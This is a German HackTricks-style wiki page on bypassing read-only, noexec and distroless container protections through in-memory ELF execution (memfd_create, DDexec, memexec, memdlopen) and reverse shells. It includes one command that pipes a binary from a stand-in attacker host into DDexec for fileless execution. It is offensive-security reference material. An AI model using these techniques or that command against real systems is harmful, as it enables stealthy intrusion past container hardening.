# Bypass von FS-Schutzmaßnahmen: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

In den folgenden Videos werden die auf dieser Seite erwähnten Techniken ausführlicher erklärt:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Nur-Lese-/no-exec-Szenario

In einem Container kannst du das Root-Dateisystem als read-only einbinden, indem du **`readOnlyRootFilesystem: true`** im Security Context setzt.<sup>[[3]](#references)</sup> Zum Beispiel:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ein read-only Root-Dateisystem macht separat eingebundene Volumes nicht read-only. Docker behandelt **`/dev/shm`** als IPC-Mount, während tmpfs-Optionen wie `rw` und `noexec` Laufzeitkonfigurationsoptionen sind. Prüfe die Mount-Optionen des Zielcontainers, bevor du dich auf eines dieser Verhaltensweisen verlässt.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Aus red-team-Sicht kann diese Kombination das Herunterladen und Ausführen von Binaries erschweren, die nicht bereits verfügbar sind (zum Beispiel Backdoors oder Enumeration-Tools).<sup>[[4]](#references)[[5]](#references)</sup>

## Einfachster Bypass: Skripte

Ein `noexec`-Mount verhindert die direkte Ausführung von Binaries auf diesem Mount, aber ein Interpreter kann ein Skript weiterhin lesen und interpretieren. Wenn `sh` oder `python` vorhanden ist, kannst du daher ein Shell- oder Python-Skript über diesen Interpreter ausführen.<sup>[[5]](#references)</sup>

Das hilft nicht, wenn das benötigte Tool selbst ein Binary ist.<sup>[[5]](#references)</sup>

## Speicher-Bypasses

Wenn die direkte Ausführung von einem eingebundenen Pfad blockiert ist, besteht eine Möglichkeit darin, das ELF in den Speicher zu laden und über einen In-Memory-Pfad auszuführen. Damit wird die `noexec`-Prüfung für diesen Mount umgangen, andere Kernel-, Berechtigungs- oder Richtlinienkontrollen bleiben jedoch bestehen.<sup>[[5]](#references)[[6]](#references)</sup>

### FD- und exec-Syscall-Bypass

Wenn eine Scripting-Laufzeitumgebung auf die entsprechende Linux-Schnittstelle zugreifen kann, kann sie mit **`memfd_create(2)`** einen anonymen, RAM-basierten Dateideskriptor erstellen, die ELF-Bytes hineinschreiben und einen fd-basierten Ausführungspfad verwenden. Das Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) erzeugt komprimierten und base64-kodierten Python-, Perl- oder Ruby-Code für diesen Ablauf.<sup>[[6]](#references)[[7]](#references)</sup>

Das Projekt dokumentiert derzeit Python-, Perl- und Ruby-Ziele. PHP oder Node benötigen eine andere laufzeitspezifische Technik oder Erweiterung. Dass es für eine Sprache keinen Generator gibt, bedeutet also nicht, dass eine In-Memory-Ausführung unmöglich ist.<sup>[[6]](#references)[[12]](#references)</sup>

Unter [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) findest du eine umfassendere Übersicht über die Ausführung anonymer Dateien, verwandte Staging-Muster sowie Erkennung und forensische Datensammlung.

> [!WARNING]
> Eine reguläre ausführbare Datei, die nach **`/dev/shm`** geschrieben wird, unterliegt weiterhin der **`noexec`**-Einstellung dieses Mounts. Sie einfach über einen gewöhnlichen Dateideskriptor zu öffnen, ändert die Mount-Richtlinie nicht.<sup>[[5]](#references)</sup>
>
> Die genaue Methode zur Speicherausführung hängt außerdem von der Laufzeitumgebung, der Architektur, dem Kernel und den verfügbaren Berechtigungen ab.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) schreibt einen Stager und Loader über **`/proc/self/mem`** in den laufenden Shell-Prozess und übergibt dann die Kontrolle an diesen Code.<sup>[[8]](#references)</sup>

Dadurch kann der Prozess ein bereitgestelltes Binary laden, ohne es vorher auf einem ausführbaren Dateisystem abzulegen.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** kann Shellcode oder ein Binary aus dem **Speicher** laden und **ausführen**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Weitere Informationen zu dieser Technik findest du auf GitHub oder hier:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ist eine daemonisierte DDexec-Implementierung. Der Daemon wartet auf Anfragen mit Argumenten und rohen Programm-Bytes, erstellt für jedes Programm einen Child-Prozess, der es lädt und ausführt, und lässt den Parent als Server laufen.<sup>[[9]](#references)</sup>

Das Repository enthält ein Beispiel, wie **memexec zum Ausführen von Binaries aus einer PHP-Reverse-Shell** verwendet werden kann: [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Mit einem ähnlichen Zweck wie DDexec ist [**memdlopen**](https://github.com/arget13/memdlopen) eine dateilose `dlopen()`-Implementierung für ein Shared Object oder Programm. Die README dokumentiert derzeit ARM64-Unterstützung. Prüfe daher vor der Verwendung die Zielarchitektur.<sup>[[10]](#references)</sup>

## Distroless-Bypass

Eine ausführliche Erklärung dazu, **was distroless eigentlich ist**, wann es hilft, wann nicht und wie es die Post-Exploitation-Techniken in Containern verändert, findest du hier:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Was ist distroless?

Distroless-Images enthalten nur die Anwendung und ihre Runtime-Abhängigkeiten; die offiziellen Images verzichten auf Paketmanager, Shells und andere Programme, die in einer gewöhnlichen Linux-Distribution zu erwarten sind.<sup>[[11]](#references)</sup>

Wenn das Runtime-Image auf diese Abhängigkeiten beschränkt wird, ist in der Produktionsumgebung weniger Software vorhanden, die gescannt und nachverfolgt werden muss.<sup>[[11]](#references)</sup>

### Reverse Shell

In einem distroless-Container findest du möglicherweise **weder `sh` noch `bash`** für eine normale Shell noch gängige Utilities wie `ls`, `whoami` oder `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Daher funktionieren eine übliche, Shell-basierte Reverse Shell oder eine auf Utilities basierende Enumeration möglicherweise nicht.<sup>[[11]](#references)</sup>

Wenn die kompromittierte Anwendung eine Language-Runtime enthält (zum Beispiel Python für eine Flask-Anwendung oder Node.js für eine Node-Anwendung), kann ein RCE diese Runtime möglicherweise trotzdem für einen Command Channel und die Systeminspektion über deren APIs verwenden.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Verwende die verfügbare Skriptsprache, um das **System über die Möglichkeiten dieser Sprache zu enumerieren**.<sup>[[12]](#references)</sup>

Wenn kein **read-only/no-exec**-Schutz besteht, kann ein Command Channel Binaries auf ein beschreibbares, ausführbares Mount schreiben und sie ausführen. Überprüfe zuerst die Mount-Optionen und Berechtigungen.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Wenn diese Schutzmaßnahmen vorhanden sind, verwende die **oben beschriebenen Memory-Execution-Techniken**, sofern Runtime, Kernel und Berechtigungen dies zulassen.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Beispiele für das Ausnutzen von RCE-Schwachstellen, um **Reverse Shells** in Skriptsprachen zu erhalten und Binaries aus dem Speicher auszuführen, findest du in [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Linux-Speichermanipulation für Stealth und Umgehung untersuchen](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth-Intrusionen mit DDexec-ng und dlopen() im Speicher - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Einen Sicherheitskontext für einen Pod oder Container konfigurieren](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
